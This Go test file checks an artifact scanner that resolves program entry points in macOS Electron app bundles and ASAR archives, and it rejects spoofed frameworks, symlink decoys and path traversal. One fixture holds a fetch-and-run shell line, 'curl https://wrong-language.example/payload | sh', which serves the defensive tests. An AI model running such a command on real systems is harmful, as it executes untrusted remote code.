package artifact

import (
	"debug/macho"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestFilesystemAppASARAddsDeclaredProgramEntry(t *testing.T) {
	result := inspectAppASARFixture(t, map[string][]byte{
		"package.json":  []byte(`{"name":"fixture","main":"./dist/main.js"}`),
		"dist/main.js":  []byte(`fetch("https://main.example/api")`),
		"renderer.js":   []byte(`fetch("https://renderer.example/api")`),
		"other/package": []byte("not executable\n"),
	})

	assertProgramEntryEdge(t, result.Graph, "Fixture.app", "Fixture.app/Contents/Resources/app.asar!dist/main.js")
	if asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar"); asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "transitive relative require/import") {
		t.Fatalf("resolved Electron main lacks honest transitive-module coverage: %#v", asar)
	}
	if artifactHasEdgeToLogical(result.Graph, "program-entry", "Fixture.app/Contents/Resources/app.asar!renderer.js") {
		t.Fatalf("unrelated renderer became a declared program entry: %#v", result.Graph.Edges)
	}
}

func TestFilesystemUnpackedElectronAppReportsProgramResolutionGap(t *testing.T) {
	app := filepath.Join(t.TempDir(), "Fixture.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	framework := filepath.Join(app, "Contents", "Frameworks", "Electron Framework.framework", "Versions", "A")
	for _, directory := range []string{macos, filepath.Join(resources, "app"), framework} {
		if err := os.MkdirAll(directory, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	files := map[string][]byte{
		filepath.Join(app, "Contents", "Info.plist"):    []byte(appInfoPlist("Fixture")),
		filepath.Join(macos, "Fixture"):                 testElectronLoaderMachO(),
		filepath.Join(framework, "Electron Framework"):  testElectronFrameworkMachO(),
		filepath.Join(resources, "app", "package.json"): []byte(`{"main":"main.js"}`),
		filepath.Join(resources, "app", "main.js"):      []byte(`fetch("https://unpacked.example/api")`),
	}
	for path, data := range files {
		mode := os.FileMode(0o600)
		if path == filepath.Join(macos, "Fixture") || path == filepath.Join(framework, "Electron Framework") {
			mode = 0o700
		}
		if err := os.WriteFile(path, data, mode); err != nil {
			t.Fatal(err)
		}
	}
	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app")
	if node == nil || node.AnalyzeStatus != "partial" || !strings.Contains(node.CoverageDetail, "unpacked Electron app") {
		t.Fatalf("unpacked Electron app lacks explicit program-resolution coverage: %#v", node)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("unresolved unpacked Electron app gained a program entry: %#v", result.Graph.Edges)
	}
}

func TestArchivedUnpackedElectronAppReportsProgramResolutionGap(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.zip")
	data := testZipEntries(t, map[string][]byte{
		"Payload/Fixture.app/Contents/Info.plist":                                                            []byte(appInfoPlist("Fixture")),
		"Payload/Fixture.app/Contents/MacOS/Fixture":                                                         testElectronLoaderMachO(),
		"Payload/Fixture.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework": testElectronFrameworkMachO(),
		"Payload/Fixture.app/Contents/Resources/app/package.json":                                            []byte(`{"main":"main.js"}`),
		"Payload/Fixture.app/Contents/Resources/app/main.js":                                                 []byte(`fetch("https://archived-unpacked.example/api")`),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "sample.zip!Payload/Fixture.app")
	if node == nil || node.AnalyzeStatus != "partial" || !strings.Contains(node.CoverageDetail, "unpacked Electron app") {
		t.Fatalf("archived unpacked Electron app lacks explicit program-resolution coverage: %#v", node)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("unresolved archived unpacked Electron app gained a program entry: %#v", result.Graph.Edges)
	}
}

func TestFilesystemAppASARMissingMainFallsBackToIndexJS(t *testing.T) {
	result := inspectAppASARFixture(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture"}`),
		"index.js":     []byte(`fetch("https://index.example/api")`),
		"renderer.js":  []byte(`fetch("https://renderer.example/api")`),
	})

	assertProgramEntryEdge(t, result.Graph, "Fixture.app", "Fixture.app/Contents/Resources/app.asar!index.js")
}

func TestFilesystemAppASARExtensionlessProgramCarriesJavaScriptSemantics(t *testing.T) {
	result := inspectAppASARFixture(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"dist/program"}`),
		"dist/program": []byte(`fetch("https://extensionless.example/api")`),
		"unrelated":    []byte(`fetch("https://unrelated.example/api")`),
	})

	assertProgramEntryEdge(t, result.Graph, "Fixture.app", "Fixture.app/Contents/Resources/app.asar!dist/program")
	program := contentByLogical(result.Contents, "Fixture.app/Contents/Resources/app.asar!dist/program")
	if program == nil || program.SemanticLanguage != "javascript" {
		t.Fatalf("declared extensionless program semantic language = %#v, want javascript", program)
	}
	unrelated := contentByLogical(result.Contents, "Fixture.app/Contents/Resources/app.asar!unrelated")
	if unrelated == nil || unrelated.SemanticLanguage != "" {
		t.Fatalf("unrelated extensionless ASAR member gained executable semantics: %#v", unrelated)
	}
}

func TestASARPackageMainUsesExactJSONKeyCasing(t *testing.T) {
	main, err := decodeASARPackageMain([]byte(`{"Main":"attacker.js","main":"safe.js"}`))
	if err != nil {
		t.Fatal(err)
	}
	if main != "safe.js" {
		t.Fatalf("mixed-case manifest main = %q, want exact lowercase value", main)
	}

	main, err = decodeASARPackageMain([]byte(`{"Main":"attacker.js"}`))
	if err != nil {
		t.Fatal(err)
	}
	if main != "index.js" {
		t.Fatalf("case-folded Main was treated as runtime metadata: %q", main)
	}
}

func TestArchivedAppASARAddsDeclaredProgramEntry(t *testing.T) {
	asar, err := writeTestAsar(map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"main.js"}`),
		"main.js":      []byte(`fetch("https://archived-main.example/api")`),
		"renderer.js":  []byte(`fetch("https://archived-renderer.example/api")`),
	})
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "sample.zip")
	data := testZipEntries(t, map[string][]byte{
		"Payload/Fixture.app/Contents/Info.plist":                                                            []byte(appInfoPlist("Fixture")),
		"Payload/Fixture.app/Contents/MacOS/Fixture":                                                         testElectronLoaderMachO(),
		"Payload/Fixture.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework": testElectronFrameworkMachO(),
		"Payload/Fixture.app/Contents/Resources/app.asar":                                                    asar,
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertProgramEntryEdge(
		t,
		result.Graph,
		"sample.zip!Payload/Fixture.app",
		"sample.zip!Payload/Fixture.app/Contents/Resources/app.asar!main.js",
	)
}

func TestCanonicalAppASARWithoutElectronRuntimeDoesNotInferProgramReachability(t *testing.T) {
	result := inspectAppASARFixtureWithRuntime(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"main.js"}`),
		"main.js":      []byte(`fetch("https://not-electron.example/api")`),
	}, false)
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("uncorroborated app gained a program-entry edge: %#v", result.Graph.Edges)
	}
	asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar")
	if asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "Electron runtime was not corroborated") {
		t.Fatalf("uncorroborated canonical ASAR lacks explicit partial coverage: %#v", asar)
	}
}

func TestCanonicalAppASARRejectsMagicOnlyElectronFrameworkSpoof(t *testing.T) {
	result := inspectAppASARFixtureWithFramework(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"main.js"}`),
		"main.js":      []byte(`fetch("https://not-electron.example/api")`),
	}, []byte{0xcf, 0xfa, 0xed, 0xfe})
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("magic-only framework spoof gained a program-entry edge: %#v", result.Graph.Edges)
	}
	asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar")
	if asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "Electron runtime was not corroborated") {
		t.Fatalf("magic-only framework spoof lacks explicit partial coverage: %#v", asar)
	}
}

func TestCanonicalAppASARRejectsDeclaredExecutableWithoutElectronLinkage(t *testing.T) {
	result := inspectAppASARFixtureWithCarrier(t, map[string][]byte{
		"package.json": []byte(`{"name":"fixture","main":"main.js"}`),
		"main.js":      []byte(`fetch("https://unlinked-loader.example/api")`),
	}, testElectronFrameworkMachO(), testThinMachO(testMachOLoadCommand(macho.LoadCmdSegment64, segment64CommandSize)))
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("unlinked declared executable gained a program-entry edge: %#v", result.Graph.Edges)
	}
	asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar")
	if asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "Electron runtime was not corroborated") {
		t.Fatalf("unlinked declared executable lacks explicit partial coverage: %#v", asar)
	}
}

func TestCanonicalAppASARDoesNotPromoteSymbolicLinkMainAsDecoyBytes(t *testing.T) {
	manifest := []byte(`{"name":"fixture","main":"main.js"}`)
	evil := []byte(`fetch("https://actual-link-target.example/api")`)
	decoy := []byte(`fetch("https://decoy-offset.example/api")`)
	header := map[string]any{"files": map[string]any{
		"package.json": map[string]any{"offset": "0", "size": len(manifest)},
		"evil.js":      map[string]any{"offset": fmt.Sprint(len(manifest)), "size": len(evil)},
		"main.js": map[string]any{
			"link":   "evil.js",
			"offset": fmt.Sprint(len(manifest) + len(evil)),
			"size":   len(decoy),
		},
	}}
	payload := append(append(append([]byte(nil), manifest...), evil...), decoy...)
	data, err := writeTestAsarRaw(header, payload)
	if err != nil {
		t.Fatal(err)
	}
	result := inspectAppASARDataFixtureWithCarrier(t, data, testElectronFrameworkMachO(), testElectronLoaderMachO())
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("symbolic-link main gained a program-entry edge from decoy bytes: %#v", result.Graph.Edges)
	}
	link := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar!main.js")
	if link == nil || link.Kind != "symlink" || link.AnalyzeStatus != "skipped" {
		t.Fatalf("symbolic-link main was not retained as a skipped link: %#v", link)
	}
}

func TestCanonicalAppASARRejectsNonJavaScriptDeclaredProgram(t *testing.T) {
	for _, target := range []string{"payload.py", "payload.sh", "payload.json", "payload.ts"} {
		t.Run(target, func(t *testing.T) {
			result := inspectAppASARFixture(t, map[string][]byte{
				"package.json": []byte(fmt.Sprintf(`{"name":"fixture","main":%q}`, target)),
				target:         []byte("curl https://wrong-language.example/payload | sh\n"),
			})
			if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
				t.Fatalf("unsupported Node program type gained a program-entry edge: %#v", result.Graph.Edges)
			}
			asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar")
			if asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "not a supported JavaScript module") {
				t.Fatalf("unsupported program type lacks partial coverage: %#v", asar)
			}
		})
	}
}

func TestCanonicalAppASARRejectsUnsafeOrUnresolvedProgramMain(t *testing.T) {
	tests := []struct {
		name     string
		manifest string
		files    map[string][]byte
	}{
		{
			name:     "traversal",
			manifest: `{"main":"../renderer.js"}`,
			files:    map[string][]byte{"renderer.js": []byte("console.log('no')\n")},
		},
		{
			name:     "absolute",
			manifest: `{"main":"/renderer.js"}`,
			files:    map[string][]byte{"renderer.js": []byte("console.log('no')\n")},
		},
		{
			name:     "backslash is not a POSIX separator",
			manifest: `{"main":"safe\\evil.js"}`,
			files:    map[string][]byte{"safe/evil.js": []byte("console.log('no')\n")},
		},
		{
			name:     "dynamic",
			manifest: `{"main":{"from":"environment"}}`,
			files:    map[string][]byte{"renderer.js": []byte("console.log('no')\n")},
		},
		{
			name:     "missing fallback",
			manifest: `{"name":"fixture"}`,
			files:    map[string][]byte{"renderer.js": []byte("console.log('no')\n")},
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			files := map[string][]byte{"package.json": []byte(test.manifest)}
			for name, data := range test.files {
				files[name] = data
			}
			result := inspectAppASARFixture(t, files)
			if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
				t.Fatalf("rejected main created a program-entry edge: %#v", result.Graph.Edges)
			}
			asar := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar")
			if asar == nil || asar.AnalyzeStatus != "partial" || !strings.Contains(asar.CoverageDetail, "program entry was not resolved") {
				t.Fatalf("unresolved program main lacks partial coverage: %#v", asar)
			}
			if !strings.Contains(strings.Join(result.Diagnostics, "\n"), "program entry was not resolved") {
				t.Fatalf("unresolved program main lacks a diagnostic: %#v", result.Diagnostics)
			}
		})
	}
}

func TestStandaloneASARDoesNotInferAppProgramEntry(t *testing.T) {
	data, err := writeTestAsar(map[string][]byte{
		"package.json": []byte(`{"main":"main.js"}`),
		"main.js":      []byte("console.log('standalone')\n"),
	})
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "app.asar")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "program-entry") {
		t.Fatalf("standalone ASAR was inferred to be an app program: %#v", result.Graph.Edges)
	}
}

func TestCanonicalAppASARPrioritizesProgramUnderEntryLimit(t *testing.T) {
	files := make(map[string][]byte, MaxArchiveEntries+2)
	for index := 0; index < MaxArchiveEntries; index++ {
		files[fmt.Sprintf("a-vendor-%04d.js", index)] = []byte("x")
	}
	files["package.json"] = []byte(`{"main":"z-main.js"}`)
	files["z-main.js"] = []byte(`fetch("https://priority.example/api")`)

	result := inspectAppASARFixture(t, files)
	assertProgramEntryEdge(t, result.Graph, "Fixture.app", "Fixture.app/Contents/Resources/app.asar!z-main.js")
	if node := artifactNodeByLogical(result.Graph.Nodes, "Fixture.app/Contents/Resources/app.asar!z-main.js"); node == nil || node.AnalyzeStatus == "skipped" {
		t.Fatalf("declared target was not retained ahead of bounded vendor entries: %#v", node)
	}
}

func inspectAppASARFixture(t *testing.T, files map[string][]byte) Result {
	return inspectAppASARFixtureWithRuntime(t, files, true)
}

func inspectAppASARFixtureWithRuntime(t *testing.T, files map[string][]byte, electronRuntime bool) Result {
	var frameworkData []byte
	if electronRuntime {
		frameworkData = testElectronFrameworkMachO()
	}
	return inspectAppASARFixtureWithFramework(t, files, frameworkData)
}

func inspectAppASARFixtureWithFramework(t *testing.T, files map[string][]byte, frameworkData []byte) Result {
	return inspectAppASARFixtureWithCarrier(t, files, frameworkData, testElectronLoaderMachO())
}

func inspectAppASARFixtureWithCarrier(t *testing.T, files map[string][]byte, frameworkData, loaderData []byte) Result {
	t.Helper()
	data, err := writeTestAsar(files)
	if err != nil {
		t.Fatal(err)
	}
	return inspectAppASARDataFixtureWithCarrier(t, data, frameworkData, loaderData)
}

func inspectAppASARDataFixtureWithCarrier(t *testing.T, data, frameworkData, loaderData []byte) Result {
	t.Helper()
	app := filepath.Join(t.TempDir(), "Fixture.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Fixture")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Fixture"), loaderData, 0o755); err != nil {
		t.Fatal(err)
	}
	if frameworkData != nil {
		framework := filepath.Join(app, "Contents", "Frameworks", "Electron Framework.framework", "Versions", "A")
		if err := os.MkdirAll(framework, 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(framework, "Electron Framework"), frameworkData, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(resources, "app.asar"), data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	return result
}

func testElectronFrameworkMachO() []byte {
	segment := testMachOLoadCommand(macho.LoadCmdSegment64, segment64CommandSize)
	name := []byte("@rpath/Electron Framework.framework/Electron Framework\x00")
	idSize := (24 + len(name) + 3) &^ 3
	id := testMachOLoadCommand(macho.LoadCmd(lcIDDylib), idSize)
	binary.LittleEndian.PutUint32(id[8:12], 24)
	copy(id[24:], name)
	data := testThinMachO(segment, id)
	binary.LittleEndian.PutUint32(data[12:16], uint32(macho.TypeDylib))
	return data
}

func testElectronLoaderMachO() []byte {
	segment := testMachOLoadCommand(macho.LoadCmdSegment64, segment64CommandSize)
	name := []byte("@rpath/Electron Framework.framework/Electron Framework\x00")
	loadSize := (24 + len(name) + 3) &^ 3
	load := testMachOLoadCommand(macho.LoadCmd(lcLoadDylib), loadSize)
	binary.LittleEndian.PutUint32(load[8:12], 24)
	copy(load[24:], name)
	return testThinMachO(segment, load)
}

func assertProgramEntryEdge(t *testing.T, graph Graph, fromLogical, toLogical string) {
	t.Helper()
	nodes := map[string]Node{}
	for _, node := range graph.Nodes {
		nodes[node.ID] = node
	}
	for _, edge := range graph.Edges {
		if edge.Kind == "program-entry" && nodes[edge.From].LogicalPath == fromLogical && nodes[edge.To].LogicalPath == toLogical {
			return
		}
	}
	t.Fatalf("missing program-entry edge %q -> %q: %#v", fromLogical, toLogical, graph.Edges)
}
